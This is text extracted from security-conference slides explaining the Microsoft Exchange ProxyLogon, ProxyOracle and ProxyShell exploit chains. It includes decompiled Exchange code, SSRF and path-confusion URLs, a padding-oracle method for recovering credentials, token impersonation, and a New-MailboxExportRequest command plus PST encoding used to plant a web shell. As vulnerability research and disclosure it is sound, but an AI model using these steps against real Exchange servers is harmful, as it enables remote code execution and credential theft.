> GetTargetBackEndServerUrl
> CreateServerRequest
> GetServerResponse
3.
Response Section
> CopyHeadersToClientResponse
> CopyCookiesToClientResponse
BeginRequest
AuthenticateRequest
AuthorizeRequest
MapRequestHandler
EndRequest
IHttpHandler
LogRequest
Backend Rehydration Module
• IIS has implicitly done the Authentication and set 
the User.Identity to current HttpContext object
private void OnAuthenticateRequest(object source, 
EventArgs args) {
if (httpContext.Request.IsAuthenticated) {
this.ProcessRequest(httpContext);
}
}
private void ProcessRequest(HttpContext httpContext) {
CommonAccessToken token;
if (this.TryGetCommonAccessToken(httpContext, out token))
// …
}
\BackendRehydrationModule.cs
BeginRequest
AuthenticateRequest
AuthorizeRequest
MapRequestHandler
EndRequest
IHttpHandler
LogRequest
1
Restore Frontend User Identity
2
private bool TryGetCommonAccessToken(HttpContext httpContext, out 
CommonAccessToken token) {
string text = httpContext.Request.Headers["X-CommonAccessToken"];
flag = this.IsTokenSerializationAllowed(httpContext.User.Identity
as WindowsIdentity);
if (!flag)
throw new BackendRehydrationException(…)
token = CommonAccessToken.Deserialize(text);
httpContext.Items["Item-CommonAccessToken"] = token;
Security\Authentication\BackendRehydrationModule.cs
1
Is Token Serialization Allowed?
2
private bool TryGetCommonAccessToken(HttpContext httpContext, out 
CommonAccessToken token) {
string text = httpContext.Request.Headers["X-CommonAccessToken"];
flag = this.IsTokenSerializationAllowed(httpContext.User.Identity
as WindowsIdentity);
if (!flag)
throw new BackendRehydrationException(…)
token = CommonAccessToken.Deserialize(text);
httpContext.Items["Item-CommonAccessToken"] = token;
Security\Authentication\BackendRehydrationModule.cs
Check AD Extended Rights
private bool IsTokenSerializationAllowed(WindowsIdentity windowsIdentity) {
flag2 = LocalServer.AllowsTokenSerializationBy(clientSecurityContext);
return flag2;
}
private static bool AllowsTokenSerializationBy(ClientSecurityContext clientContext) {
return LocalServer.HasExtendedRightOnServer(clientContext, 
WellKnownGuid.TokenSerializationRightGuid);  // ms-Exch-EPI-Token-Serialization
}
Security\Authentication\BackendRehydrationModule.cs
Auth-Flow in Summary
1.
Frontend IIS authenticates the request (Windows or Basic authentication) and serializes the 
current Identity to X-CommonAccessToken HTTP header
2.
Frontend generates a Kerberos ticket by its HTTP SPN to Authorization HTTP header
3.
Frontend proxies the HTTP request to Backend
4.
Backend IIS authenticates the request and check the authenticated user has TokenSerialization right
5.
Backend rehydrates the user from X-CommonAccessToken HTTP header
HTTP/HTTPS
CAS Backend
Module
F
Rehydration
Module
Module
D
Module
E
CAS Frontend
HttpProxy
Module
Module A
Module B
Module C
HTTP/HTTPS
Let's Hack the Planet
ProxyLogon
• The most well-known Exchange Server vulnerability in the world😩
• An unauthenticated attacker can execute arbitrary codes on Microsoft Exchange 
Server through an only exposed 443 port!
• ProxyLogon is chained with 2 bugs:
• CVE-2021-26855 - Pre-auth SSRF leads to Authentication Bypass
• CVE-2021-27065 - Post-auth Arbitrary-File-Write leads to RCE
Where ProxyLogon Begin?
1.
Request Section
> CopyHeadersToServerRequest
> CopyCookiesToServerRequest
> AddProtocolSpecificHeadersToServerRequest
2.
Proxy Section
> GetTargetBackEndServerUrl
> CreateServerRequest
> GetServerResponse
3.
Response Section
> CopyHeadersToClientResponse
> CopyCookiesToClientResponse
BeginRequest
AuthenticateRequest
AuthorizeRequest
MapRequestHandler
EndRequest
IHttpHandler
LogRequest
Arbitrary Backend Assignment
1
2
protected override AnchorMailbox ResolveAnchorMailbox() {
HttpCookie httpCookie = base.ClientRequest.Cookies["X-AnonResource-Backend"];
if (httpCookie != null) {
this.savedBackendServer = httpCookie.Value;
}
return new ServerInfoAnchorMailbox(
BackEndServer.FromString(this.savedBackendServer), this);
}
HttpProxy\OwaResourceProxyRequestHandler.cs
https://[foo]@example.com:443/path#]:444/owa/auth/x.js
Super SSRF
• What's the root cause about this arbitrary backend assignment?
• The Exchange has to adapt the compatibility between new and old architectures, 
hence Exchange introduces the cookie
• A Super SSRF
• Control almost all the HTTP request and get all the response
• Attach with a Kerberos Ticket with Exchange$ account privilege automatically
• Leverage the backend internal API /ecp/proxylogon.ecp to obtain a valid Control 
Panel session and a file-write bug to get RCE
Demo
https://youtu.be/SvjGMo9aMwE
ProxyOracle
• An interesting Exchange Server exploit with different approach
• An unauthenticated attacker can recover the victim's username and password 
in plaintext format simply by pushing the user open the malicious link
• ProxyOracle is chained with 2 bugs:
• CVE-2021-31195 - Reflected Cross-Site Scripting 
• CVE-2021-31196 - Padding Oracle Attack on Exchange Cookies Parsing
How Users Log-in OWA/ECP?
Form-Based Authentication
IIS
IIS
Remote
PowerShell
RPC 
Proxy
EWS/OWA
ECP/OAB…
Mailbox Database
HTTP/HTTPS
IIS Modules
Validation
Logging
IIS Modules
Filter
FBA
Oauth
…
Rehydration
Routing
Update
RBAC
HTTP Proxy Module
How FBA Cookies Looks Like
cadataTTL
cadataKey
cadata
cadataIV
cadataSig
FbaModule Encryption Logic
@key = GetServerSSLCert().GetPrivateKey()
cadataSig = RSA(@key).Encrypt("Fba Rocks!")
cadataIV
= RSA(@key).Encrypt(GetRandomBytes(16))
cadataKey = RSA(@key).Encrypt(GetRandomBytes(16))
@timestamp = GetCurrentTimestamp()
cadataTTL
= AES_CBC(cadataKey, cadataIV).Encrypt(@timestamp)
@blob  = "Basic " + ToBase64String(UserName + ":" + Password)
cadata = AES_CBC(cadataKey, cadataIV).Encrypt(@blob)
PSEUDO CODE
FbaModule Encryption Logic
private void ParseCadataCookies(HttpApplication httpApplication) {
using (ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor()) {
try {
byte[] array5 = Convert.FromBase64String(request.Cookies["cadata"].Value);
bytes2 = transform.TransformFinalBlock(array5, 0, array5.Length);
} catch (CryptographicException arg8) {
return;
}
}
}
HttpProxy\FbaModule.cs
The Oracle
protected enum LogonReason {
None,
Logoff,
InvalidCredentials,
Timeout,
ChangePasswordLogoff
}
\FbaModule.cs
Padding 
Error
Padding 
Good
Login
Failure
Login
Success
AES
Decrypt
/logon.aspx
?reason=2
Continue
Login
/logon.aspx
?reason=0
We can decrypt the cookies now
But… How to get the client cookies?
We discover a new XSS to chain together
However, all sensitive cookies are protected by HttpOnly😥
Visit page /foo.gif
Send response
Proxy page /foo.gif
Send response
Send malicious mail to victim
Trigger the XSS
Set SSRF cookie
Take Over Client Requests
Victim
Exchange
Attacker
Open malicious mail
Redirect to XSS page
1
2
3
4
Demo
https://youtu.be/VuJvmJZxogc
ProxyShell
• The exploit chain we demonstrated at Pwn2Own 2021
• An unauthenticated attacker can execute arbitrary commands on Microsoft 
Exchange Server through an only exposed 443 port!
• ProxyShell is chained with 3 bugs:
• CVE-2021-34473 - Pre-auth Path Confusion leads to ACL Bypass
• CVE-2021-34523 - Elevation of Privilege on Exchange PowerShell Backend
• CVE-2021-31207
- Post-auth Arbitrary-File-Write leads to RCE
Where ProxyShell Begin?
1.
Request Section
> CopyHeadersToServerRequest
> CopyCookiesToServerRequest
> AddProtocolSpecificHeadersToServerRequest
2.
Proxy Section
> GetTargetBackEndServerUrl
> CreateServerRequest
> GetServerResponse
3.
Response Section
> CopyHeadersToClientResponse
> CopyCookiesToClientResponse
BeginRequest
AuthenticateRequest
AuthorizeRequest
MapRequestHandler
EndRequest
IHttpHandler
LogRequest
ProxyShell
• ProxyShell started with a Path Confusion bug on Exchange Server  
Explicit Logon feature
• The feature is designed to enable users to open another mailbox/calendar and 
display it in a new browser window
• The Exchange parsed the mailbox address and normalized the URL internally
https://exchange/OWA/PI:EMAIL/Default.aspx
2
Extract Mailbox Address from URL
1
protected override AnchorMailbox ResolveAnchorMailbox() {
if (RequestPathParser.IsAutodiscoverV2PreviewRequest(base.ClientRequest.Url.AbsolutePath)) 
text = base.ClientRequest.Params["Email"];
// …
this.isExplicitLogonRequest = true;
this.explicitLogonAddress = text;
}
public static bool IsAutodiscoverV2PreviewRequest(string path) {
return path.EndsWith("/autodiscover.json", StringComparison.OrdinalIgnoreCase);
}
HttpProxy\EwsAutodiscoverProxyRequestHandler.cs
The Fatal Erase
protected override UriBuilder GetClientUrlForProxy() {
string absoluteUri = base.ClientRequest.Url.AbsoluteUri;
uri = UrlHelper.RemoveExplicitLogonFromUrlAbsoluteUri(absoluteUri, 
this.explicitLogonAddress);
return new UriBuilder(uri);
}
public static string RemoveExplicitLogonFromUrlAbsoluteUri(string absoluteUri, string
explicitLogonAddress) {
string text = "/" + explicitLogonAddress;
if (absoluteUri.IndexOf(text) != -1)
return absoluteUri.Substring(0, num) + absoluteUri.Substring(num + text.Length);
}
HttpProxy\EwsAutodiscoverProxyRequestHandler.cs
1
2
The actual part to be removed
Explicit Logon pattern
https://exchange/autodiscover/autodiscover.json?@foo.com/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
The actual part to be removed
Explicit Logon pattern
https://exchange/autodiscover/autodiscover.json?@foo.com/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
https://exchange:444/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
Arbitrary Backend Access Again!
Exchange PowerShell Remoting
• The Exchange PowerShell Remoting is a command-line interface that 
enables the automation of Exchange tasks
• The Exchange PowerShell Remoting is built upon PowerShell API and uses the 
Runspace for isolations. All operations are based on WinRM protocol
• Interact with the PowerShell Backend fails because there is no mailbox for the 
SYSTEM user
• We found a piece of code extract Access-Token from URL 
Extract Access Token from URL
2
1
private void OnAuthenticateRequest(object source, EventArgs args) {
HttpContext httpContext = HttpContext.Current;
if (httpContext.Request.IsAuthenticated) {
if (string.IsNullOrEmpty(httpContext.Request.Headers["X-CommonAccessToken"])) {
Uri url = httpContext.Request.Url;
Exception ex = null;
CommonAccessToken commonAccessToken = CommonAccessTokenFromUrl(httpContext.
User.Identity.ToString(), url, out ex);
}
}
}
\Configuration\RemotePowershellBackendCmdletProxyModule.cs
Extract Access Token from URL
private CommonAccessToken CommonAccessTokenFromUrl(string user, Uri requestURI, 
out Exception ex) {
CommonAccessToken result = null;
string text = LiveIdBasicAuthModule.GetNameValueCollectionFromUri(
requestURI).Get("X-Rps-CAT");
result = CommonAccessToken.Deserialize(Uri.UnescapeDataString(text));
return result;
}
\RemotePowershellBackendCmdletProxyModule.cs
Privilege Downgrade
• An Elevation of Privilege (EOP) because we can access Exchange 
PowerShell Backend directly
• The intention of this operation is to be a quick proxy for Internal Exchange 
PowerShell communications
• Specify the Access-Token in X-Rps-CAT to Impersonate to any user
• We use this Privilege Escalation to "downgrade" ourself from SYSTEM to Exchange 
Admin
Execute Arbitrary Exchange PowerShell as Admin
And then?
Attack Exchange PowerShell
• The last piece of the puzzle is to find a post-auth RCE to chain together
• Since we are Exchange admin now, It's easy to abuse the Exchange PowerShell 
command New-MailboxExportRequest to export user's mailbox into an UNC path
New-MailboxExportRequest –Mailbox PI:EMAIL
–FilePath \\127.0.0.1\C$\path\to\shell.aspx
Payload Delivery
• How to embed the malicious payload into the exported file?
• We deliver the malicious payloads by Emails (SMTP)  but the file is encoded😢
• The exported file is in Outlook Personal Folders (PST) format, by reading the MS-
PST documentation, we learned it's just a simple permutation encoding
mpbbCrypt = [65, 54, 19, 98, 168, 33, 110, 187, 244, 22, 204, 4, 127, 100, 232, …]
encode_table = bytes.maketrans((bytearray(mpbbCrypt), bytearray(range(256)))
'…'.translate(encode_table)
\RemotePowershellBackendCmdletProxyModule.cs
Put it All Together
1.
Deliver our encoded WebShell payload by SMTP 
2. Launch the native PowerShell and intercept the WinRM protocol
• Rewrite the /PowerShell/ to /Autodiscover/ to trigger the Path Confusion bug
• Add query string X-Rps-CAT with corresponding Exchange Admin Access Token
3. Execute commands inside the established PowerShell session
• New-ManagementRoleAssignment to grant ourself Mailbox Import Export Role
• New-MailboxExportRequest to write ASPX file into the local UNC path
4. Enjoy the shell
Demo
https://youtu.be/FC6iHw258RI
Mitigations
1.
Keep Exchange Server up-to-date and not externally facing the 
Internet (especially web part)
2.
Microsoft has enhanced the CAS Frontend in April 2021
• The enhancement mitigated the authentication part of this attack surface and 
reduced the "pre-auth" effectively
3. Move to Office 365 Exchange Online😏(Just kidding)
Conclusion
• Modern problems require modern solutions
• Try to comprehend the architectures from a higher point of view
• The Exchange CAS is still a good attack surface
• Due to the lack of "pre-auth" bugs, the result may not be as powerful as before
• Exchange is still a buried treasure and waiting for you to hunt bugs
• Fun fact - even you found a super critical bug like ProxyLogon, Microsoft will not 
reward you any bounty because Exchange Server On-Prem is out of scope
orange_8361
PI:EMAIL
Thanks!
https://blog.orange.tw